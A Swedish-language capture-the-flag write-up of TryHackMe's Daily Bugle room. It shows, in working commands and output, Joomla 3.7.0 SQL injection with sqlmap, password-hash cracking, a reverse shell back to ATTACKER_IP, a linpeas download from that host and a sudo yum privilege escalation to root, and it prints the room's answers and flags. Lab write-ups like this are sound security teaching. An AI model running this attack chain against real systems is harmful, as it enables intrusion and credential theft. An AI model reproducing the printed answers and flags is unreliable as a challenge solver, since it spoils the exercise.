---
title: "Daily Bugle Writeup"
date: 2023-07-12
tags: [writeup, ctf, tryhackme]
description: "Fingerprinting och exploatering av en Joomla-installation med Metasploit för att få fotfäste och eskalera behörighet i TryHackMes Daily Bugle-rum."
---

## Setup 

Vi måste först ansluta till TryHackMes VPN-server. Du kan få mer information om detta genom att besöka sidan [Access](https://tryhackme.com/access).

Jag kommer att använda `openvpn` för att ansluta till servern. Här är kommandot:

```
$ sudo openvpn --config NovusEdge.ovpn
```

## Reconnaissance
Dags för några snabba portskanningar och rekognosering (gud välsigne skaparna av `rustscan`):
```shell-session
$ rustscan -b 4500 -a TARGET_IP --ulimit 5000 -t 2000 -r 1-65535 -- -oN rustscan_port_scan.txt
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack
80/tcp   open  http    syn-ack
3306/tcp open  mysql   syn-ack

$ rustscan -b 4500 -a TARGET_IP --ulimit 5000 -t 2000 -p22,80,3306 -- -sC -sV -oN rustscan_service_scan.txt
PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 68:ed:7b:19:7f:ed:14:e6:18:98:6d:c5:88:30:aa:e9 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCbp89KqmXj7Xx84uhisjiT7pGPYepXVTr4MnPu1P4fnlWzevm6BjeQgDBnoRVhddsjHhI1k+xdnahjcv6kykfT3mSeljfy+jRc+2ejMB95oK2AGycavgOfF4FLPYtd5J97WqRmu2ZC2sQUvbGMUsrNaKLAVdWRIqO5OO07WIGtr3c2ZsM417TTcTsSh1Cjhx3F+gbgi0BbBAN3sQqySa91AFruPA+m0R9JnDX5rzXmhWwzAM1Y8R72c4XKXRXdQT9szyyEiEwaXyT0p6XiaaDyxT2WMXTZEBSUKOHUQiUhX7JjBaeVvuX4ITG+W8zpZ6uXUrUySytuzMXlPyfMBy8B
|   256 5c:d6:82:da:b2:19:e3:37:99:fb:96:82:08:70:ee:9d (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKb+wNoVp40Na4/Ycep7p++QQiOmDvP550H86ivDdM/7XF9mqOfdhWK0rrvkwq9EDZqibDZr3vL8MtwuMVV5Src=
|   256 d2:a9:75:cf:2f:1e:f5:44:4f:0b:13:c2:0f:d7:37:cc (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP4TcvlwCGpiawPyNCkuXTK5CCpat+Bv8LycyNdiTJHX
80/tcp   open  http    syn-ack Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
|_http-favicon: Unknown favicon MD5: 1194D7D32448E1F90741A97B42AF91FA
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-generator: Joomla! - Open Source Content Management
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.6.40
|_http-title: Home
| http-robots.txt: 15 disallowed entries 
| /joomla/administrator/ /administrator/ /bin/ /cache/ 
| /cli/ /components/ /includes/ /installation/ /language/ 
|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
3306/tcp open  mysql   syn-ack MariaDB (unauthorized)
```

Låt oss kolla om vi kan få ut något via metasploit:
```shell-session
$ sudo msfconsole -q
msf6 > search joomla
...
10  auxiliary/scanner/http/joomla_version
...

msf6 > use 10
msf6 auxiliary(scanner/http/joomla_version) > setg RHOSTS TARGET_IP
RHOSTS => TARGET_IP
msf6 auxiliary(scanner/http/joomla_version) > run

[*] Server: Apache/2.4.6 (CentOS) PHP/5.6.40
[+] Joomla version: 3.7.0
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

> Vad är Joomla-versionen?
> 
> Svar: `3.7.0`

En snabb sökning på ExploitDB efter Joomla 3.7 visar en schyst exploit som vi kan använda: https://www.exploit-db.com/exploits/42033

```txt

URL Vulnerable: http://localhost/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml%27


Using Sqlmap: 

sqlmap -u "http://localhost/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]
```

Låt oss även göra lite katalog-enumerering medan vi ändå håller på:
```shell-session
$ gobuster dir -u http://TARGET_IP/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 64 -o enum_gobuster.txt
/media                (Status: 301) [Size: 233] [--> http://TARGET_IP/media/]
/templates            (Status: 301) [Size: 237] [--> http://TARGET_IP/templates/]
/images               (Status: 301) [Size: 234] [--> http://TARGET_IP/images/]
/modules              (Status: 301) [Size: 235] [--> http://TARGET_IP/modules/]
/bin                  (Status: 301) [Size: 231] [--> http://TARGET_IP/bin/]
/plugins              (Status: 301) [Size: 235] [--> http://TARGET_IP/plugins/]
/includes             (Status: 301) [Size: 236] [--> http://TARGET_IP/includes/]
/language             (Status: 301) [Size: 236] [--> http://TARGET_IP/language/]
/components           (Status: 301) [Size: 238] [--> http://TARGET_IP/components/]
/cache                (Status: 301) [Size: 233] [--> http://TARGET_IP/cache/]
/libraries            (Status: 301) [Size: 237] [--> http://TARGET_IP/libraries/]
/tmp                  (Status: 301) [Size: 231] [--> http://TARGET_IP/tmp/]
/layouts              (Status: 301) [Size: 235] [--> http://TARGET_IP/layouts/]
/administrator        (Status: 301) [Size: 241] [--> http://TARGET_IP/administrator/]
/cli                  (Status: 301) [Size: 231] [--> http://TARGET_IP/cli/]
```
När vi besöker sökvägen `/administrator` kommer vi till följande sida:
![](/assets/img/writeup_assets/daily-bugle/login-page.png)

Enligt [Joomla Documentation](https://docs.joomla.org/Administrator_(User)):
> Standardanvändaren för Super Users är admin och installeras med varje Joomla!-sajt.

Ännu en snabb sökning via searchsploit ger oss en trevlig exploit för SQLi på joomla 3.7.0:
```shell-session
$ searchsploit Joomla 3.7.0
$ searchsploit -p php/webapps/42033.txt
...
$ cp /usr/share/exploitdb/exploits/php/webapps/42033.txt .
```

När vi läser igenom denna exploit ser vi att den ger oss ett smidigt `sqlmap`-kommando:
```shell-session
$ sqlmap -u "http://localhost/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]
```

Genom att lägga till flaggorna `--tables` och `-D joomla` kan vi specificera att vi vill försöka förstå databasens tabeller först, och vilken typ av databas vi ska attackera.
```shell-session
$ sqlmap -u "http://TARGET_IP/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs --tables -p list[fullordering] -D joomla
```

Detta ger oss totalt 72 tabeller att arbeta med, de flesta är inte särskilt användbara, men en av dem vi kan använda är tabellen `__users`:
```shell-session
$ sqlmap -u "http://TARGET_IP/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs --columns -p list[fullordering] -D joomla -T '#__users'

...
do you want to use common column existence check? [y/N/q] y
...
[00:08:34] [INFO] retrieved: id
[00:08:34] [INFO] retrieved: name
[00:08:35] [INFO] retrieved: username
[00:08:39] [INFO] retrieved: email
[00:09:20] [INFO] retrieved: password
...
```

Snyggt! Låt oss nu försöka dumpa kolumnerna `username` och password:
```shell-session
$ sqlmap -u "http://TARGET_IP/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering] -D joomla -T '#__users' --dump -C password
...
+----------+--------------------------------------------------------------+
| username | password                                                     |
+----------+--------------------------------------------------------------+
| jonah    | $2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm |
+----------+--------------------------------------------------------------+
```

Okej, så vi har ett användarnamn och en lösenordshash, låt oss knäcka den. (Ser ut som en blowfish-hash):
```shell-session
$ john --wordlist=/usr/share/seclists/Passwords/rockyou.txt hash.txt
spiderman123     (?)
```

> Vad är Jonahs knäckta lösenord?
> 
> Svar: `spiderman123`

Detta ger oss tillgång till kontrollpanelen för Joomla CMS på vårt målsystem. Härnäst kommer vi att använda detta för att få ett första fotfäste...

## Gaining Access

Från användarpanelen, navigera till mallmenyn och prova att ladda upp ett php reverse shell. Det fungerade inte för mig, så som ett alternativ redigerade jag helt enkelt innehållet i `index.php` i standardmallen, d.v.s. klistrade in koden för reverse shellet där.


När vi startar en lyssnare på vår maskin och öppnar payloaden vi laddade upp (`index.html` i detta fall), får vi ett trevligt reverse shell:

```shell-session
$ nc -nvlp 4444
# Try requesting TARGET_IP/index.php/
listening on [any] 4444 ...
connect to [ATTACKER_IP] from (UNKNOWN) [TARGET_IP] 44852
Linux dailybugle 3.10.0-1062.el7.x86_64 #1 SMP Wed Aug 7 18:08:02 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 01:01:38 up  2:02,  0 users,  load average: 0.01, 0.03, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=48(apache) gid=48(apache) groups=48(apache)
bash: no job control in this shell
bash-4.2$ 
```


Låt oss stabilisera shellet innan vi fortsätter:
```shell-session
bash-4.2$ python -c "import pty; pty.spawn('/bin/bash')"
python -c "import pty; pty.spawn('/bin/bash')"
bash-4.2$ ^Z
zsh: suspended  nc -nvlp 4444
$ stty raw -echo && fg
[1]  + continued  nc -nvlp 4444
                               export TERM=xterm-256-color
bash-4.2$ 
```
Snyggt! Nu kan vi fortsätta med det vanliga:
```shell-session
bash-4.2$ whoami
apache
bash-4.2$ uname -a
Linux dailybugle 3.10.0-1062.el7.x86_64 #1 SMP Wed Aug 7 18:08:02 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
bash-4.2$ cat /etc/issue
\S
Kernel \r on an \m

bash-4.2$ cat /etc/os-release 
NAME="CentOS Linux"
VERSION="7 (Core)"
ID="centos"
ID_LIKE="rhel fedora"
VERSION_ID="7"
PRETTY_NAME="CentOS Linux 7 (Core)"
ANSI_COLOR="0;31"
CPE_NAME="cpe:/o:centos:centos:7"
HOME_URL="https://www.centos.org/"
BUG_REPORT_URL="https://bugs.centos.org/"

CENTOS_MANTISBT_PROJECT="CentOS-7"
CENTOS_MANTISBT_PROJECT_VERSION="7"
REDHAT_SUPPORT_PRODUCT="centos"
REDHAT_SUPPORT_PRODUCT_VERSION="7"
```

Låt oss prova att använda `linpeas` för att göra det lite enklare:
```shell-session
# Getting the linpeas script from our machine...
bash-4.2$ wget http://ATTACKER_IP:8080/linpeas.sh
bash-4.2$ sh linpeas.sh 
...
╔══════════╣ Searching passwords in config PHP files
        public $password = 'nv5uz9r3ZEDzVjNu';
...
```

Nåväl, vi har ett lösenord, så låt oss para ihop det med användarnamnet `jjameson` (bruh, kör bara `ls` i `/home`-katalogen -\_-) och försöka logga in på maskinen via `ssh`:
```shell-session
$ ssh jjameson@TARGET_IP
jjameson@TARGET_IP's password: ...

[jjameson@dailybugle ~]$ ls -la
total 16
drwx------. 2 jjameson jjameson  99 Dec 15  2019 .
drwxr-xr-x. 3 root     root      22 Dec 14  2019 ..
lrwxrwxrwx  1 jjameson jjameson   9 Dec 14  2019 .bash_history -> /dev/null
-rw-r--r--. 1 jjameson jjameson  18 Aug  8  2019 .bash_logout
-rw-r--r--. 1 jjameson jjameson 193 Aug  8  2019 .bash_profile
-rw-r--r--. 1 jjameson jjameson 231 Aug  8  2019 .bashrc
-rw-rw-r--  1 jjameson jjameson  33 Dec 15  2019 user.txt
[jjameson@dailybugle ~]$ cat user.txt 
27a260fe3cba712cfdedb1c86d80442e
```

Snyggt! Nu går vi vidare till behörighetseskalering...

## Privilege Escalation

Låt oss testa lite rekognosering först:
```shell-session
[jjameson@dailybugle ~]$ sudo -l
Matching Defaults entries for jjameson on dailybugle:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset,
    env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME
    LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES",
    env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE
    LINGUAS _XKB_CHARSET XAUTHORITY", secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User jjameson may run the following commands on dailybugle:
    (ALL) NOPASSWD: /usr/bin/yum
```

OOOOOOOO, VI HAR EN TRÄFF GUBBAR!!! Ett besök på gamla pålitliga GTFObins och en sökning på `yum` visar 2 alternativ för att få ett root-shell med `sudo`:

![](/assets/img/writeup_assets/daily-bugle/yum-privesc.png)

```shell-session
# Just copy-paste into shell:
TF=$(mktemp -d)
cat >$TF/x<<EOF
[main]
plugins=1
pluginpath=$TF
pluginconfpath=$TF
EOF

cat >$TF/y.conf<<EOF
[main]
enabled=1
EOF

cat >$TF/y.py<<EOF
import os
import yum
from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
requires_api_version='2.1'
def init_hook(conduit):
  os.execl('/bin/sh','/bin/sh')
EOF

sudo yum -c $TF/x --enableplugin=y
sh-4.2# whoami
root

sh-4.2# cd /root
sh-4.2# ls
anaconda-ks.cfg  root.txt
sh-4.2# cat root.txt 
eec3d53292b1821868266858d7fa6f79
```

> Vad är root-flaggan?
> 
> Svar: `eec3d53292b1821868266858d7fa6f79`


## Conclusion
Om den här writeupen hjälper, överväg gärna att följa mig på [github](https://github.com/NovusEdge) och/eller ge en stjärna på repot: https://github.com/NovusEdge/thm-writeups


- Room: [Daily Bugle](https://tryhackme.com/room/dailybugle)
